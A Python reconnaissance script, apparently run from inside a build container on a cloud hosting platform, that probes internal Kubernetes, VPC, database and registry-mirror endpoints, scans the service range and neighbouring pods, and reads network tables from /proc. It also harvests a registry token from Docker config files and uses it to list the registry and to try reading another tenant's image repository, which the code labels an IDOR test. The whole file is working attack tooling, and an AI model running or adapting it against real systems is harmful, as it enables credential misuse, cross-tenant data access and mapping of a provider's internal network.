import json, os, socket, subprocess, time, struct

r = {}

# 1. VPC network access (DOKS worker IPs from our clusters)
vpc_targets = {
    # DOKS Cluster A workers (nyc1 VPC)
    '10.116.0.2:443': 'doks-worker-a1',
    '10.116.0.3:443': 'doks-worker-a2',
    '10.116.0.2:10250': 'kubelet-a1',
    # DOKS Cluster B workers (nyc2 VPC)
    '10.116.0.4:443': 'doks-worker-b',
    # Common VPC services
    '10.116.0.1:443': 'vpc-gateway',
    '10.116.0.1:80': 'vpc-gateway-80',
    # Managed DB default ports
    '10.116.0.2:25060': 'managed-db-pg',
    '10.116.0.2:25061': 'managed-db-mysql',
    '10.116.0.2:6379': 'managed-redis',
    # CGNAT (DOKS control plane bridge)
    '100.65.67.229:443': 'cp-bridge-a',
    '100.65.74.2:443': 'cp-bridge-b',
    # Anchor IP (OTEL)
    '10.10.0.5:4318': 'otel-anchor',
}

r['vpc'] = {}
for target, label in vpc_targets.items():
    host, port = target.rsplit(':', 1)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        ret = s.connect_ex((host, int(port)))
        if ret == 0:
            r['vpc'][target] = f'CONNECTED ({label})'
        else:
            r['vpc'][target] = f'errno={ret}'
        s.close()
    except Exception as e:
        r['vpc'][target] = str(e)[:60]

# 2. Docker Hub mirror
mirror_targets = {
    'docker-cache.docker-cache.svc.cluster.local:5000': 'docker-mirror',
    'docker-cache.docker-cache.svc.cluster.local:443': 'docker-mirror-tls',
}
r['mirror'] = {}
for target, label in mirror_targets.items():
    host, port = target.rsplit(':', 1)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        ret = s.connect_ex((host, int(port)))
        if ret == 0:
            r['mirror'][target] = 'CONNECTED'
            s.close()
            # Try HTTP catalog request
            import urllib.request
            try:
                resp = urllib.request.urlopen(f'http://{host}:{port}/v2/_catalog', timeout=3)
                r['mirror'][f'{target}_catalog'] = resp.read().decode()[:2000]
            except Exception as e:
                r['mirror'][f'{target}_catalog'] = str(e)[:200]
        else:
            r['mirror'][target] = f'errno={ret}'
            s.close()
    except Exception as e:
        r['mirror'][target] = str(e)[:60]

# 3. K8s API access
k8s_targets = {
    '10.245.0.1:443': 'k8s-api',
    '10.245.0.1:8443': 'k8s-api-8443',
    '10.245.0.10:53': 'kube-dns',
    '10.245.0.10:9153': 'kube-dns-metrics',
}
r['k8s'] = {}
for target, label in k8s_targets.items():
    host, port = target.rsplit(':', 1)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        ret = s.connect_ex((host, int(port)))
        r['k8s'][target] = f'CONNECTED' if ret == 0 else f'errno={ret}'
        s.close()
    except Exception as e:
        r['k8s'][target] = str(e)[:60]

# Try HTTP to K8s API
try:
    import urllib.request, ssl
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    resp = urllib.request.urlopen('https://10.245.0.1:443/version', timeout=5, context=ctx)
    r['k8s_version'] = resp.read().decode()[:500]
except Exception as e:
    r['k8s_version'] = str(e)[:200]

# 4. Internet egress test
r['egress'] = {}
for target in ['8.8.8.8:53', '8.8.8.8:443', '1.1.1.1:80']:
    host, port = target.rsplit(':', 1)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        ret = s.connect_ex((host, int(port)))
        r['egress'][target] = 'CONNECTED' if ret == 0 else f'errno={ret}'
        s.close()
    except Exception as e:
        r['egress'][target] = str(e)[:60]

# 5. DOCR direct access - try to list/pull other repos
r['docr'] = {}
try:
    import urllib.request, ssl
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    # Read own docker config for token
    token = None
    for cfg_path in ['/kaniko/.docker/config.json', '/run/docker_config/config.json', '/home/cnb/.docker/config.json']:
        try:
            import json as j
            cfg = j.loads(open(cfg_path).read())
            for reg, auth in cfg.get('auths', {}).items():
                if 'docr' in reg:
                    token = auth.get('registrytoken', auth.get('auth', ''))
                    r['docr']['config_path'] = cfg_path
                    r['docr']['registry'] = reg
                    break
        except:
            pass

    if token:
        # Try catalog (list all repos)
        req = urllib.request.Request(f'https://apps-nyc.docr.space/v2/_catalog',
            headers={'Authorization': f'Bearer {token}'})
        try:
            resp = urllib.request.urlopen(req, timeout=5, context=ctx)
            r['docr']['catalog'] = resp.read().decode()[:2000]
        except Exception as e:
            r['docr']['catalog'] = str(e)[:200]

        # Try listing tags for a different app's repo (IDOR test)
        req2 = urllib.request.Request(f'https://apps-nyc.docr.space/v2/apps-nyc3-00000000-0000-0000-0000-000000000000/web/tags/list',
            headers={'Authorization': f'Bearer {token}'})
        try:
            resp2 = urllib.request.urlopen(req2, timeout=5, context=ctx)
            r['docr']['idor_test'] = resp2.read().decode()[:500]
        except Exception as e:
            r['docr']['idor_test'] = str(e)[:200]
    else:
        r['docr']['token'] = 'not_found'
except Exception as e:
    r['docr']['err'] = str(e)[:200]

# 6. K8s service CIDR scan (quick scan of common services)
r['svc_scan'] = {}
for ip_suffix in [1, 2, 3, 10, 11, 50, 100, 200]:
    target = f'10.245.0.{ip_suffix}'
    for port in [443, 80, 8080]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            ret = s.connect_ex((target, port))
            if ret == 0:
                r['svc_scan'][f'{target}:{port}'] = 'CONNECTED'
            s.close()
        except:
            pass

# 7. DNS service discovery
r['dns_disc'] = {}
dns_queries = [
    'docker-cache.docker-cache.svc.cluster.local',
    'kubernetes.default.svc.cluster.local',
    'kube-dns.kube-system.svc.cluster.local',
    'apps-nyc.docr.space',
    '*.build-*.svc.cluster.local',
]
for name in dns_queries:
    try:
        result = socket.getaddrinfo(name, None)
        r['dns_disc'][name] = result[0][4][0]
    except Exception as e:
        r['dns_disc'][name] = str(e)[:60]

# 8. Subnet scan around our pod IP
r['neighbors'] = {}
try:
    my_ip = socket.gethostbyname(socket.gethostname())
    r['my_ip'] = my_ip
    # Scan /24 around our IP
    prefix = '.'.join(my_ip.split('.')[:3])
    for i in range(1, 20):  # Just first 20
        target = f'{prefix}.{i}'
        if target == my_ip:
            continue
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            ret = s.connect_ex((target, 8080))
            if ret == 0:
                r['neighbors'][target] = 'port_8080_open'
            s.close()
        except:
            pass
except Exception as e:
    r['neighbors_err'] = str(e)[:100]

# 9. DOKS public CP access (internet path)
r['doks_cp'] = {}
for target in ['24.199.65.106:443', '24.199.65.106:8999', '45.55.116.41:443']:
    host, port = target.rsplit(':', 1)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        ret = s.connect_ex((host, int(port)))
        r['doks_cp'][target] = 'CONNECTED' if ret == 0 else f'errno={ret}'
        s.close()
    except Exception as e:
        r['doks_cp'][target] = str(e)[:60]

# 10. /proc/net/tcp - check all established connections
r['connections'] = {}
try:
    tcp = open('/proc/net/tcp').read()
    tcp6 = open('/proc/net/tcp6').read()
    r['connections']['tcp'] = tcp[:1000]
    r['connections']['tcp6'] = tcp6[:1000]
except:
    pass

# 11. Route table
try:
    r['routes'] = open('/proc/net/route').read()[:500]
except:
    pass

# 12. Netstat-style: what ports are we listening on
try:
    lines = open('/proc/net/tcp').readlines()[1:]
    listening = []
    for line in lines:
        parts = line.split()
        if len(parts) > 3 and parts[3] == '0A':  # LISTEN state
            local = parts[1]
            ip_hex, port_hex = local.split(':')
            port = int(port_hex, 16)
            listening.append(port)
    r['listening_ports'] = listening
except:
    pass

print(json.dumps(r, indent=2, default=str))
